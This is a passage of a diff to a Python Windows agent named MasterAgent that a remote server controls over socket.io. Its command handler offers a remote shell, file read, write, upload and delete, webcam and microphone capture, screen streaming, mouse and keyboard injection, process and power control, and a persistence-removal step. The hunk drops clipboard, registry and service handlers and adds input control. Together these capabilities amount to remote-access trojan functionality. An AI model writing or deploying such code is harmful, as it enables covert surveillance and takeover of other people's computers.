-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "disks": sys_monitor.get_disk_list(),
-                })
-
-            elif tab == "network":
-                sio.emit("network_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "interfaces": sys_monitor.get_network_interfaces(),
-                })
-
-            # ── Processes ──────────────────────────────────────────────────
-            elif tab == "processes":
-                procs = proc_mgr.list_processes()
-                sio.emit("processes_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "processes": procs,
-                    "count": len(procs),
-                })
-
-            elif tab == "kill_process":
-                sio.emit("kill_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **proc_mgr.kill_process(int(data.get("pid", 0))),
-                })
-
-            elif tab == "start_process":
-                sio.emit("start_process_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **proc_mgr.start_process(data.get("command", "")),
-                })
-
-            elif tab == "suspend_process":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "suspend_process",
-                    **proc_mgr.suspend_process(int(data.get("pid", 0))),
-                })
-
-            elif tab == "resume_process":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "resume_process",
-                    **proc_mgr.resume_process(int(data.get("pid", 0))),
-                })
-
-            # ── Shell ──────────────────────────────────────────────────────
-            elif tab == "shell":
-                result = shell.execute(
-                    data.get("command", "echo hello"),
-                    shell_type=data.get("shell_type", "cmd"),
-                )
-                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
-
-            elif tab == "shell_env":
-                sio.emit("shell_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **shell.get_env(),
-                })
-
-            # ── Files ──────────────────────────────────────────────────────
-            elif tab == "file_list":
-                sio.emit("file_list_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.list_directory(data.get("path", "C:\\")),
-                })
-
-            elif tab == "file_read":
-                sio.emit("file_read_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.read_file(data.get("path", "")),
-                })
-
-            elif tab == "file_write":
-                sio.emit("file_read_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.write_file(data.get("path", ""), data.get("content", "")),
-                })
-
-            elif tab == "file_download":
-                sio.emit("file_download_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.download_file(data.get("path", "")),
-                })
-
-            elif tab == "file_upload":
-                sio.emit("file_download_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.upload_file(data.get("path", ""), data.get("data", "")),
-                })
-
-            elif tab == "file_delete":
-                sio.emit("file_delete_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.delete_file(data.get("path", "")),
-                })
-
-            elif tab == "file_copy":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "file_copy",
-                    **files.copy_file(data.get("src", ""), data.get("dst", "")),
-                })
-
-            elif tab == "file_move":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "file_move",
-                    **files.move_file(data.get("src", ""), data.get("dst", "")),
-                })
-
-            elif tab == "file_mkdir":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "file_mkdir",
-                    **files.create_folder(data.get("path", "")),
-                })
-
-            elif tab == "file_rename":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "file_rename",
-                    **files.rename(data.get("old", ""), data.get("new", "")),
-                })
-
-            elif tab == "file_search":
-                sio.emit("file_list_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **files.search(data.get("root", "C:\\"), data.get("pattern", "*")),
-                })
-
-            elif tab == "drives":
-                sio.emit("drives_report", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "drives": files.list_drives(),
-                })
-
-            # ── Webcam ─────────────────────────────────────────────────────
-            elif tab == "webcam":
-                sio.emit("webcam_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    **webcam.capture(data.get("camera", 0), data.get("quality", 80)),
-                })
-
-            elif tab == "webcam_list":
-                sio.emit("webcam_list_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "cameras": webcam.list_cameras(),
-                })
-
-            # ── Clipboard ──────────────────────────────────────────────────
-            elif tab == "clipboard_get":
-                if CLIPBOARD_OK:
-                    sio.emit("clipboard_result", {
+            try:
+                # ── Monitor/stream/mouse — handled by Advanced Monitor engine ──
+                if tab == "monitor":
+                    action = data.get("action", "start")
+                    if data.get("fps") is not None:
+                        new_fps = max(10, min(int(data.get("fps")), 60))
+                        CONFIG["STREAM_FPS"] = new_fps
+                    if data.get("quality") is not None:
+                        CONFIG["STREAM_QUALITY"] = max(10, min(int(data.get("quality")), 100))
+                    if data.get("scale") is not None:
+                        CONFIG["STREAM_SCALE"] = max(0.1, min(float(data.get("scale")), 1.0))
+                    
+                    if action == "start":
+                        global _adv_viewers
+                        _adv_viewers = max(_adv_viewers, 1)
+                        log.info("Forced _adv_viewers=1 via request_action")
+                        _start_screenshot_fallback(sio)
+                    elif action == "stop":
+                        _fb_stop.set()
+                
+                # ── Power Management ──────────────────────────────────────────
+                elif tab in ("shutdown", "restart", "sleep", "lock_screen", "logoff", "abort_shutdown", "hibernate"):
+                    log.info(f"Power command: {tab}")
+                    if tab == "lock_screen":
+                        ctypes.windll.user32.LockWorkStation()
+                    elif tab == "sleep":
+                        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+                    elif tab == "hibernate":
+                        os.system("rundll32.exe powrprof.dll,SetSuspendState 1,1,0")
+                    elif tab == "shutdown":
+                        os.system("shutdown /s /t 5 /f")
+                    elif tab == "restart":
+                        os.system("shutdown /r /t 5 /f")
+                    elif tab == "logoff":
+                        os.system("shutdown /l")
+                    elif tab == "abort_shutdown":
+                        os.system("shutdown /a")
+                    
+                    sio.emit("action_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "content": pyperclip.paste()[:8192],
-                        "ts": datetime.utcnow().isoformat(),
+                        "action": tab, "success": True, "ts": datetime.utcnow().isoformat()
                     })
 
-            elif tab == "clipboard_set":
-                if CLIPBOARD_OK:
-                    pyperclip.copy(data.get("text", ""))
-                    sio.emit("clipboard_set_result", {
+                # ── Process Manager ───────────────────────────────────────────
+                elif tab == "processes":
+                    procs = proc_mgr.list_processes()
+                    sio.emit("processes_report", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "success": True,
+                        "processes": procs, "count": len(procs),
+                        "ts": datetime.utcnow().isoformat()
                     })
+                elif tab in ("kill_process", "suspend_process", "resume_process"):
+                    pid = int(data.get("pid", 0))
+                    if tab == "kill_process": res = proc_mgr.kill_process(pid)
+                    elif tab == "suspend_process": res = proc_mgr.suspend_process(pid)
+                    else: res = proc_mgr.resume_process(pid)
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "pid": pid, **res })
+                elif tab == "start_process":
+                    res = proc_mgr.start_process(data.get("command", ""))
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "start_process", **res })
 
-            # ── Registry ───────────────────────────────────────────────────
-            elif tab == "registry_read":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "registry_read",
-                    **registry.read_key(data.get("path", ""), data.get("value", "")),
-                })
+                # ── Remote Shell ──────────────────────────────────────────────
+                elif tab == "shell":
+                    cmd = data.get("command", "")
+                    stype = data.get("shell_type", "cmd")
+                    result = shell.execute(cmd, shell_type=stype)
+                    sio.emit("shell_result", { "device_id": CONFIG["DEVICE_TOKEN"], "command": cmd, "shell_type": stype, **result })
+                elif tab == "shell_env":
+                    res = shell.get_env()
+                    sio.emit("shell_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "env", **res })
 
-            elif tab == "registry_list":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "registry_list",
-                    **registry.list_key(data.get("path", "")),
-                })
+                # ── File Browser ──────────────────────────────────────────────
+                elif tab == "file_list":
+                    path = data.get("path", "C:\\")
+                    res = files.list_directory(path)
+                    sio.emit("file_list_result", { "device_id": CONFIG["DEVICE_TOKEN"], "path": path, **res })
+                elif tab == "file_read":
+                    res = files.read_file(data.get("path", ""))
+                    sio.emit("file_read_result", { "device_id": CONFIG["DEVICE_TOKEN"], **res })
+                elif tab == "file_write":
+                    res = files.write_file(data.get("path", ""), data.get("content", ""))
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "file_write", **res })
+                elif tab == "file_delete":
+                    res = files.delete_file(data.get("path", ""))
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "file_delete", **res })
+                elif tab == "file_search":
+                    res = files.search(data.get("root", "C:\\"), data.get("pattern", "*"))
+                    sio.emit("file_list_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "search", **res })
+                elif tab == "drives":
+                    drives = files.list_drives()
+                    sio.emit("drives_report", { "device_id": CONFIG["DEVICE_TOKEN"], "drives": drives })
 
-            elif tab == "registry_write":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "registry_write",
-                    **registry.write_key(data.get("path", ""), data.get("name", ""),
-                                         data.get("data", ""), int(data.get("type", winreg.REG_SZ))),
-                })
+                # ── System Info ───────────────────────────────────────────────
+                elif tab == "system_snapshot":
+                    sio.emit("system_stats_report", { "device_id": CONFIG["DEVICE_TOKEN"], **sys_monitor.get_snapshot() })
+                elif tab == "network":
+                    sio.emit("network_report", { "device_id": CONFIG["DEVICE_TOKEN"], "interfaces": sys_monitor.get_network_interfaces() })
+                elif tab == "disks":
+                    sio.emit("disks_report", { "device_id": CONFIG["DEVICE_TOKEN"], "disks": sys_monitor.get_disk_list() })
 
-            elif tab == "registry_delete":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "registry_delete",
-                    **registry.delete_value(data.get("path", ""), data.get("name", "")),
-                })
+                # ── Webcam & Audio ────────────────────────────────────────────
+                elif tab == "webcam":
+                    res = webcam.capture(data.get("camera", 0), data.get("quality", 80))
+                    sio.emit("webcam_result", { "device_id": CONFIG["DEVICE_TOKEN"], **res })
+                elif tab == "webcam_list":
+                    res = webcam.list_cameras()
+                    sio.emit("webcam_list_result", { "device_id": CONFIG["DEVICE_TOKEN"], "cameras": res })
+                elif tab == "audio_capture":
+                    res = audio.capture_chunk(seconds=float(data.get("seconds", 3.0)))
+                    sio.emit("audio_result", { "device_id": CONFIG["DEVICE_TOKEN"], **res })
+                elif tab == "audio_devices":
+                    res = audio.list_devices()
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "audio_devices", "devices": res })
 
-            # ── Services ───────────────────────────────────────────────────
-            elif tab == "services_list":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "services_list",
-                    "services": services.list_services(),
-                })
+        # ── Mouse & Keyboard ──────────────────────────────────────────
+                elif tab == "sync" or tab == "refresh":
+                    log.info("Manual Sync requested — resetting pipeline")
+                    # No-op here, the ticker/producer will pick up any changes
+                    # but we can force a keyframe on the next loop
+                    n = 0 
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "sync", "success": True })
 
-            elif tab == "service_control":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "service_control",
-                    **services.control_service(data.get("name", ""), data.get("cmd", "stop")),
-                })
+                elif tab == "mouse_move":
+                    x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0), w=data.get("w"), h=data.get("h"))
+                    pyautogui.moveTo(x, y, _pause=False)
+                elif tab == "mouse_click":
+                    x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0), w=data.get("w"), h=data.get("h"))
+                    btn = "left" if data.get("button", "left") == "left" else "right"
+                    if data.get("type") == "mouse_dblclick":
+                        pyautogui.doubleClick(x, y, button=btn, _pause=False)
+                    elif "down" in data:
+                        is_down = data.get("down", True)
+                        if is_down: pyautogui.mouseDown(x, y, button=btn, _pause=False)
+                        else: pyautogui.mouseUp(x, y, button=btn, _pause=False)
+                    else:
+                        pyautogui.click(x, y, button=btn, _pause=False)
+                elif tab == "scroll":
+                    x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0), w=data.get("w"), h=data.get("h"))
+                    pyautogui.scroll(int(data.get("delta", 3)), x=x, y=y, _pause=False)
+                elif tab == "type_text":
+                    pyautogui.write(data.get("text", ""), interval=0.01)
 
-            # ── Windows ────────────────────────────────────────────────────
-            elif tab == "windows_list":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "windows_list",
-                    "windows": winmgr.list_windows(),
-                })
+                # ── Windows & Registry ────────────────────────────────────────
+                elif tab == "windows_list":
+                    res = winmgr.list_windows()
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "windows_list", "windows": res })
+                elif tab == "registry_list":
+                    res = registry.list_key(data.get("path", ""))
+                    sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": "registry_list", **res })
 
-            elif tab == "window_focus":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "window_focus",
-                    **winmgr.focus_window(int(data.get("hwnd", 0))),
-                })
+                # ── Installed Apps ────────────────────────────────────────────
+                elif tab == "installed_apps":
+                    res = apps.list_apps()
+                    sio.emit("installed_apps_result", { "device_id": CONFIG["DEVICE_TOKEN"], "apps": res })
 
-            elif tab == "window_close":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "window_close",
-                    **winmgr.close_window(int(data.get("hwnd", 0))),
-                })
+            except Exception as e:
+                log.error(f"Error processing action {tab}: {e}")
+                sio.emit("action_error", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "error": str(e) })
 
-            elif tab == "window_minimize":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "window_minimize",
-                    **winmgr.minimize_window(int(data.get("hwnd", 0))),
-                })
-
-            elif tab == "window_maximize":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "window_maximize",
-                    **winmgr.maximize_window(int(data.get("hwnd", 0))),
-                })
-
-            # ── Installed Apps ─────────────────────────────────────────────
-            elif tab == "installed_apps":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "installed_apps",
-                    "apps": apps.list_apps(),
-                })
-
-            # ── Audio capture ──────────────────────────────────────────────
-            elif tab == "audio_capture":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "audio_capture",
-                    **audio.capture_chunk(
-                        seconds=float(data.get("seconds", 3.0)),
-                        sample_rate=int(data.get("sample_rate", 16000)),
-                    ),
-                })
-
-            elif tab == "audio_devices":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "audio_devices",
-                    "devices": audio.list_devices(),
-                })
-
-            # ── Secure erase ───────────────────────────────────────────────
-            elif tab == "secure_erase":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "secure_erase",
-                    **eraser.wipe_file(data.get("path", ""), int(data.get("passes", 3))),
-                })
-
-            # ── Power ──────────────────────────────────────────────────────
-            elif tab == "lock_screen":
-                ctypes.windll.user32.LockWorkStation()
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "lock_screen", "success": True,
-                })
-
-            elif tab == "sleep":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "sleep", "success": True,
-                })
-                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
-
-            elif tab == "shutdown":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "shutdown", "success": True,
-                })
-                time.sleep(1)
-                os.system('shutdown /s /t 10 /c "Screen Connect remote shutdown"')
-
-            elif tab == "restart":
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "restart", "success": True,
-                })
-                time.sleep(1)
-                os.system('shutdown /r /t 10 /c "Screen Connect remote restart"')
-
-            elif tab == "abort_shutdown":
-                os.system("shutdown /a")
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "abort_shutdown", "success": True,
-                })
-
-            elif tab == "logoff":
-                os.system("shutdown /l")
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "logoff", "success": True,
-                })
-
-            elif tab == "hibernate":
-                os.system("shutdown /h")
-                sio.emit("action_result", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "action": "hibernate", "success": True,
-                })
-
-            elif tab == "uninstall":
+            if tab == "uninstall":
                 remove_persistence()
                 sio.disconnect()
                 sys.exit(0)
@@ -5217,9 +5038,9 @@ if __name__ == "__main__":
         pass
 
     log.info(
-        f"═══ MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
+        f"--- MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
         f"| host={socket.gethostname()} | pid={os.getpid()}"
-        f"| server={CONFIG['SERVER_URL']} | device={CONFIG['DEVICE_TOKEN'][:12]}... ═══"
+        f"| server={CONFIG['SERVER_URL']} | device={CONFIG['DEVICE_TOKEN']}... ---"
     )
 
     agent        = ScreenConnectAgent()
